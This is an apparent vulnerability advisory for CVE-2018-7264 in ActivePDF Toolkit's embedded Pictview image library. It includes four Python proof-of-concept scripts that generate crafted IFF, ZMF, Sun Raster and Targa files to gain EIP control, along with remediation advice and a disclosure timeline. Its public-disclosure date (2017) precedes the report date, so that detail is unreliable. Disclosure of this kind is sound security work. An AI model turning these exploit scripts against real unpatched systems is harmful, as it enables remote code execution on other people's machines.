@@ -1,0 +1,201 @@
+ActivePDF Toolkit < 8.1.0 multiple RCE
+
+Introduction
+============
+The ActivePDF Toolkit is a Windows library which enhances business
+processes to stamp, stitch, merge, form-fill, add digital signatures,
+barcodes to PDF. Both .NET and native APIs are provided.  Amongst many
+other operations, this library can be used by applications to transform
+images to PDF files.
+
+Multiple vulnerabilities were identified in the Pictview image processing
+library embedded by the Toolkit and signed by ActivePDF. They could allow
+remote attackers to compromise applications relying on the Toolkit to
+process untrusted images. Note that, while the example instances hereafter
+use “exotic” file types, the parser determines the image type from magic
+bytes, ignoring file extensions in most cases.
+
+CVE
+===
+CVE-2018-7264
+
+Affected versions
+=================
+ActivePDF Toolkit before 8.1.0 (build 8.1.0.19023)
+
+Author
+======
+François Goichon - Google Security Team
+
+CVE-2018-7264
+=============
+ActivePDF Toolkit < 8.1.0.19023 multiple RCE
+
+Summary
+-------
+An image processing library embedded in the ActivePDF Toolkit product is
+prone to multiple BSS out-of-bound and signedess errors which can yield
+direct EIP control by overwriting function pointers, error handling
+structures or IAT entries. Note that the affected library does not enable
+ASLR.
+
+Reproduction
+------------
+The following scripts can be used to generate crafted image files which
+achieve EIP control when parsed or converted by the ActivePDF Toolkit (e.g.
+via the ImageToPDF method), through different root causes. These examples
+can be reproduced through both the .NET and native APIs and independently
+from file extensions, however the .NET layer will hide the native crashes
+and return -1. This may crash the library with a lock on, so only use in
+test environments.
+
+* Interchange File Format (.iff) and derivates
+---
+#!/usr/bin/env python2
+#
+# eax=28147510 ebx=00009c1c ecx=28147510 edx=00009c1c esi=28140e90
+edi=02930a6c
+# eip=41414141 esp=0061f264 ebp=0061f26c iopl=0         nv up ei pl nz na
+po nc
+# cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b
+efl=00010202
+# 41414141 ??              ???
+
+from struct import pack
+
+header = "FORMXOXOILBM"
+
+bodycontents = "AAA"
+body = "BODY" + pack(">I", len(bodycontents)) + bodycontents
+while (len(body) % 2) == 1:
+  body += "\x00"
+
+base = 0x28147510
+payload = pack("<I", base).ljust(0x28151114 - base, "A") + pack("<I", base)
+cmap = "CMAP" + pack(">I", len(payload)) + payload
+while (len(cmap) % 2) == 1:
+  cmap += "\x00"
+
+outp = header + cmap + body
+assert len(outp) >= 0x28
+
+with open("test.iff", "wb") as f:
+  f.write(outp)
+---
+
+* Zoner Draw images (.zmf, .zbr)
+---
+#!/usr/bin/env python2
+#
+# eax=28151110 ebx=0000002e ecx=0000bc28 edx=2813eb10 esi=00000008
+edi=028e0a6c
+# eip=41414141 esp=2814550c ebp=41414141 iopl=0         nv up ei ng nz ac
+pe cy
+# cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b
+efl=00010297
+# 41414141 ??              ???
+
+from struct import pack
+
+header = pack("<III", 0x5c, 0xD4015ADD, 0x12345678)
+header = header.ljust(9*4) + pack("<I", 0x3c)
+header = header.ljust(0x3c)
+
+base = 0x2814550C
+payload = '\x00' * (0x28151124 - base) + pack("<I", base) + "A"*8
+
+# can be triggered by multiple formats
+header2 = pack("<H", 0x4d42)
+header2 = header2.ljust(14) + pack("<I", 50-14)
+header2 = header2.ljust(28) + pack("<HI", 0, 0)
+header2 = header2.ljust(46) + pack("<I", len(payload)/4 + 1)
+
+outp = header + header2 + payload
+
+with open("test.zmf", "w") as f:
+  f.write(outp)
+---
+
+* Sun Raster images (.ras)
+---
+#!/usr/bin/python2
+#
+#WARNING: Stack pointer is outside the normal stack bounds. Stack unwinding
+can be inaccurate.
+#eax=28151110 ebx=0000000c ecx=0000fc2d edx=2813eb10 esi=00000008
+edi=02880a6c
+#eip=41414141 esp=28141504 ebp=41414141 iopl=0         nv up ei ng nz ac pe
+cy
+#cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b
+efl=00010297
+#41414141 ??              ???
+
+from struct import pack
+
+header = pack(">IIIIIII", 0x59A66A95, 0x100, 1, 8, 0, 2, 1)
+
+base = 0x28141504
+payload = "".ljust(0x28151124 - base, "\x00") + pack("<I", base) + "A"*8
+outp = header + pack(">I", len(payload)+1) + payload
+
+with open("test.ras", "wb") as f:
+  f.write(outp)
+---
+
+* Truevision Targa images (.bpx)
+---
+#!/usr/bin/env python2
+#
+#eax=28151110 ebx=00000004 ecx=00000008 edx=2813eb10 esi=00000008
+edi=028f0a6c
+#eip=41414141 esp=0061f2a0 ebp=0061f2e8 iopl=0         nv up ei ng nz ac pe
+cy
+#cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b
+efl=00010297
+#41414141 ??              ???
+
+from struct import pack
+
+target = 0x2815112C
+payload = "AAAA"
+
+# TGA / PIC / BPX
+base = { 3: 0x28147510, 4: 0x2814550c }
+align = None
+for al in [3, 4]:
+  if ((target - base[al]) % al) ==  0:
+    align = al
+    break
+assert align
+
+header = "\x00\x01\x00"
+header += pack("<H", (target - base[align])/align)
+header += pack("<H", (len(payload)/align)+1)
+header += chr(32 if align == 4 else 24)
+header = header.ljust(16)
+header += chr(1)
+header = header.ljust(18)
+
+with open("test.bpx", "wb") as f:
+  f.write(header + payload)
+---
+
+Remediation
+-----------
+Upgrade to ActivePDF Toolkit >= 8.1.0 (build 8.1.0.19023), which fixes the
+problem by removing the affected image processing library. Note that this
+also fixes the similar ZDI-16-354 vulnerability.
+
+For more information and guidance, please contact the ActivePDF support
+through their portal (https://support.activepdf.com).
+
+
+Disclosure timeline
+===================
+2017/11/28 - Report sent to ActivePDF support
+2017/11/28 - Support acknowledges the issue and confirms that the library
+is scheduled to be removed from the product
+2018/01/29 - Received notification from the ActivePDF support that the
+Pictview image processing library had been removed from ActivePDF in build
+8.1.0.19023
+2017/02/26 - Public disclosure
